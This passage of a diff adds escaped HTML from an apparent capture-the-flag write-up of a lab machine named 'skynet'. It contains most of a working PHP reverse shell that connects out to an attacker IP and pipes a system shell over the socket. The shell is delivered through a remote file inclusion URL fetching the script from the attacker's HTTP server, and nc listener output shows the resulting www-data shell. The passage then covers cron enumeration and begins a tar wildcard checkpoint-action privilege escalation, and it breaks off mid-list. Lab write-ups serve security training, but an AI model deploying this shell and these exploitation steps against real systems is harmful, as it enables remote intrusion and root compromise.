+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> exit&lt;span class="o">(&lt;/span>1&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$daemon&lt;/span> &lt;span class="o">=&lt;/span> 1&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> printit&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;WARNING: Failed to daemonise. This is quite common and not fatal.&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">chdir&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;/&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">umask&lt;span class="o">(&lt;/span>0&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">// Open reverse connection
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$sock&lt;/span> &lt;span class="o">=&lt;/span> fsockopen&lt;span class="o">(&lt;/span>&lt;span class="nv">$ip&lt;/span>, &lt;span class="nv">$port&lt;/span>, &lt;span class="nv">$errno&lt;/span>, &lt;span class="nv">$errstr&lt;/span>, 30&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>!&lt;span class="nv">$sock&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> printit&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$errstr&lt;/span>&lt;span class="s2"> (&lt;/span>&lt;span class="nv">$errno&lt;/span>&lt;span class="s2">)&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> exit&lt;span class="o">(&lt;/span>1&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$descriptorspec&lt;/span> &lt;span class="o">=&lt;/span> array&lt;span class="o">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">0&lt;/span> &lt;span class="o">=&lt;/span>&amp;gt; array&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;pipe&amp;#34;&lt;/span>, &lt;span class="s2">&amp;#34;r&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>, // stdin is a pipe that the child will &lt;span class="nb">read&lt;/span> from
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">1&lt;/span> &lt;span class="o">=&lt;/span>&amp;gt; array&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;pipe&amp;#34;&lt;/span>, &lt;span class="s2">&amp;#34;w&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>, // stdout is a pipe that the child will write to
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">2&lt;/span> &lt;span class="o">=&lt;/span>&amp;gt; array&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;pipe&amp;#34;&lt;/span>, &lt;span class="s2">&amp;#34;w&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span> // stderr is a pipe that the child will write to
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$process&lt;/span> &lt;span class="o">=&lt;/span> proc_open&lt;span class="o">(&lt;/span>&lt;span class="nv">$shell&lt;/span>, &lt;span class="nv">$descriptorspec&lt;/span>, &lt;span class="nv">$pipes&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>!is_resource&lt;span class="o">(&lt;/span>&lt;span class="nv">$process&lt;/span>&lt;span class="o">))&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> printit&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;ERROR: Can&amp;#39;t spawn shell&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> exit&lt;span class="o">(&lt;/span>1&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">stream_set_blocking&lt;span class="o">(&lt;/span>&lt;span class="nv">$pipes&lt;/span>&lt;span class="o">[&lt;/span>0&lt;span class="o">]&lt;/span>, 0&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">stream_set_blocking&lt;span class="o">(&lt;/span>&lt;span class="nv">$pipes&lt;/span>&lt;span class="o">[&lt;/span>1&lt;span class="o">]&lt;/span>, 0&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">stream_set_blocking&lt;span class="o">(&lt;/span>&lt;span class="nv">$pipes&lt;/span>&lt;span class="o">[&lt;/span>2&lt;span class="o">]&lt;/span>, 0&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">stream_set_blocking&lt;span class="o">(&lt;/span>&lt;span class="nv">$sock&lt;/span>, 0&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">printit&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;Successfully opened reverse shell to &lt;/span>&lt;span class="nv">$ip&lt;/span>&lt;span class="s2">:&lt;/span>&lt;span class="nv">$port&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">while&lt;/span> &lt;span class="o">(&lt;/span>1&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>feof&lt;span class="o">(&lt;/span>&lt;span class="nv">$sock&lt;/span>&lt;span class="o">))&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> printit&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;ERROR: Shell connection terminated&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> break&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>feof&lt;span class="o">(&lt;/span>&lt;span class="nv">$pipes&lt;/span>&lt;span class="o">[&lt;/span>1&lt;span class="o">]))&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> printit&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;ERROR: Shell process terminated&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> break&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$read_a&lt;/span> &lt;span class="o">=&lt;/span> array&lt;span class="o">(&lt;/span>&lt;span class="nv">$sock&lt;/span>, &lt;span class="nv">$pipes&lt;/span>&lt;span class="o">[&lt;/span>1&lt;span class="o">]&lt;/span>, &lt;span class="nv">$pipes&lt;/span>&lt;span class="o">[&lt;/span>2&lt;span class="o">])&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$num_changed_sockets&lt;/span> &lt;span class="o">=&lt;/span> stream_select&lt;span class="o">(&lt;/span>&lt;span class="nv">$read_a&lt;/span>, &lt;span class="nv">$write_a&lt;/span>, &lt;span class="nv">$error_a&lt;/span>, null&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>in_array&lt;span class="o">(&lt;/span>&lt;span class="nv">$sock&lt;/span>, &lt;span class="nv">$read_a&lt;/span>&lt;span class="o">))&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="nv">$debug&lt;/span>&lt;span class="o">)&lt;/span> printit&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;SOCK READ&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$input&lt;/span> &lt;span class="o">=&lt;/span> fread&lt;span class="o">(&lt;/span>&lt;span class="nv">$sock&lt;/span>, &lt;span class="nv">$chunk_size&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="nv">$debug&lt;/span>&lt;span class="o">)&lt;/span> printit&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;SOCK: &lt;/span>&lt;span class="nv">$input&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> fwrite&lt;span class="o">(&lt;/span>&lt;span class="nv">$pipes&lt;/span>&lt;span class="o">[&lt;/span>0&lt;span class="o">]&lt;/span>, &lt;span class="nv">$input&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>in_array&lt;span class="o">(&lt;/span>&lt;span class="nv">$pipes&lt;/span>&lt;span class="o">[&lt;/span>1&lt;span class="o">]&lt;/span>, &lt;span class="nv">$read_a&lt;/span>&lt;span class="o">))&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="nv">$debug&lt;/span>&lt;span class="o">)&lt;/span> printit&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;STDOUT READ&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$input&lt;/span> &lt;span class="o">=&lt;/span> fread&lt;span class="o">(&lt;/span>&lt;span class="nv">$pipes&lt;/span>&lt;span class="o">[&lt;/span>1&lt;span class="o">]&lt;/span>, &lt;span class="nv">$chunk_size&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="nv">$debug&lt;/span>&lt;span class="o">)&lt;/span> printit&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;STDOUT: &lt;/span>&lt;span class="nv">$input&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> fwrite&lt;span class="o">(&lt;/span>&lt;span class="nv">$sock&lt;/span>, &lt;span class="nv">$input&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>in_array&lt;span class="o">(&lt;/span>&lt;span class="nv">$pipes&lt;/span>&lt;span class="o">[&lt;/span>2&lt;span class="o">]&lt;/span>, &lt;span class="nv">$read_a&lt;/span>&lt;span class="o">))&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="nv">$debug&lt;/span>&lt;span class="o">)&lt;/span> printit&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;STDERR READ&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$input&lt;/span> &lt;span class="o">=&lt;/span> fread&lt;span class="o">(&lt;/span>&lt;span class="nv">$pipes&lt;/span>&lt;span class="o">[&lt;/span>2&lt;span class="o">]&lt;/span>, &lt;span class="nv">$chunk_size&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="nv">$debug&lt;/span>&lt;span class="o">)&lt;/span> printit&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;STDERR: &lt;/span>&lt;span class="nv">$input&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> fwrite&lt;span class="o">(&lt;/span>&lt;span class="nv">$sock&lt;/span>, &lt;span class="nv">$input&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">fclose&lt;span class="o">(&lt;/span>&lt;span class="nv">$sock&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">fclose&lt;span class="o">(&lt;/span>&lt;span class="nv">$pipes&lt;/span>&lt;span class="o">[&lt;/span>0&lt;span class="o">])&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">fclose&lt;span class="o">(&lt;/span>&lt;span class="nv">$pipes&lt;/span>&lt;span class="o">[&lt;/span>1&lt;span class="o">])&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">fclose&lt;span class="o">(&lt;/span>&lt;span class="nv">$pipes&lt;/span>&lt;span class="o">[&lt;/span>2&lt;span class="o">])&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">proc_close&lt;span class="o">(&lt;/span>&lt;span class="nv">$process&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">function&lt;/span> printit &lt;span class="o">(&lt;/span>&lt;span class="nv">$string&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>!&lt;span class="nv">$daemon&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> print &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$string&lt;/span>&lt;span class="s2">\n&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">?&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>start a python server &lt;code>python -m http.server 8000&lt;/code>&lt;/p>
+&lt;p>then start a listener: &lt;code>nc -lvnp 444&lt;/code>&lt;/p>
+&lt;p>now we go to this page:&lt;/p>
+&lt;p>&lt;code>&amp;lt;machine_ip&amp;gt;/&amp;lt;redacted&amp;gt;/administrator/alerts/alertConfigField.php?urlConfig=http://10.18.20.116:8000/php.php&lt;/code>&lt;/p>
+&lt;p>And we have our reverse shell.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc -lvnp &lt;span class="m">4444&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">listening on &lt;span class="o">[&lt;/span>any&lt;span class="o">]&lt;/span> &lt;span class="m">4444&lt;/span> ...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">connect to &lt;span class="o">[&lt;/span>10.18.20.116&lt;span class="o">]&lt;/span> from &lt;span class="o">(&lt;/span>UNKNOWN&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>10.10.34.11&lt;span class="o">]&lt;/span> &lt;span class="m">42912&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Linux skynet 4.8.0-58-generic &lt;span class="c1">#63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 09:39:18 up 1:34, &lt;span class="m">0&lt;/span> users, load average: 0.00, 0.00, 0.00
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">uid&lt;/span>&lt;span class="o">=&lt;/span>33&lt;span class="o">(&lt;/span>www-data&lt;span class="o">)&lt;/span> &lt;span class="nv">gid&lt;/span>&lt;span class="o">=&lt;/span>33&lt;span class="o">(&lt;/span>www-data&lt;span class="o">)&lt;/span> &lt;span class="nv">groups&lt;/span>&lt;span class="o">=&lt;/span>33&lt;span class="o">(&lt;/span>www-data&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bash: cannot &lt;span class="nb">set&lt;/span> terminal process group &lt;span class="o">(&lt;/span>1459&lt;span class="o">)&lt;/span>: Inappropriate ioctl &lt;span class="k">for&lt;/span> device
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bash: no job control in this shell
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">www-data@skynet:/$
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>From here we can go to miles home directory and find the user flag.&lt;/p>
+&lt;p>Now we want to get the root flag.&lt;/p>
+&lt;p>after searching for a while, the only thing that seems interessing is this:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">cat /etc/crontab
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># /etc/crontab: system-wide crontab&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Unlike any other crontab you don&amp;#39;t have to run the `crontab&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># command to install the new version when you edit this file&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># and files in /etc/cron.d. These files also have username fields,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># that none of the other crontabs do.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">SHELL&lt;/span>&lt;span class="o">=&lt;/span>/bin/sh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">PATH&lt;/span>&lt;span class="o">=&lt;/span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># m h dom mon dow user command&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">*/1 * * * * root /home/milesdyson/backups/backup.sh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">17&lt;/span> * * * * root &lt;span class="nb">cd&lt;/span> / &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> run-parts --report /etc/cron.hourly
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">25&lt;/span> &lt;span class="m">6&lt;/span> * * * root &lt;span class="nb">test&lt;/span> -x /usr/sbin/anacron &lt;span class="o">||&lt;/span> &lt;span class="o">(&lt;/span> &lt;span class="nb">cd&lt;/span> / &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> run-parts --report /etc/cron.daily &lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">47&lt;/span> &lt;span class="m">6&lt;/span> * * &lt;span class="m">7&lt;/span> root &lt;span class="nb">test&lt;/span> -x /usr/sbin/anacron &lt;span class="o">||&lt;/span> &lt;span class="o">(&lt;/span> &lt;span class="nb">cd&lt;/span> / &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> run-parts --report /etc/cron.weekly &lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">52&lt;/span> &lt;span class="m">6&lt;/span> &lt;span class="m">1&lt;/span> * * root &lt;span class="nb">test&lt;/span> -x /usr/sbin/anacron &lt;span class="o">||&lt;/span> &lt;span class="o">(&lt;/span> &lt;span class="nb">cd&lt;/span> / &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> run-parts --report /etc/cron.monthly &lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>There is a backup running all minutes, and it is using root privileges.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">cat backup.sh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#!/bin/bash&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> /var/www/html
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tar cf /home/milesdyson/backups/backup.tgz *
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>This script is very simple, it just goes to the &lt;code>/var/www/html&lt;/code> folder and archiving all of the data inside &lt;code>/home/milesdyson/backups/backup.tgz *&lt;/code>&lt;/p>
+&lt;p>The thing is, that we can write inside the &lt;code>/var/www/html&lt;/code> directory.&lt;/p>
+&lt;p>So we can use this GTFObin script:&lt;/p>
+&lt;p>&lt;strong>Shell&lt;/strong>&lt;/p>
+&lt;p>It can be used to break out from restricted environments by spawning an interactive system shell.&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh&lt;/code>&lt;/li>
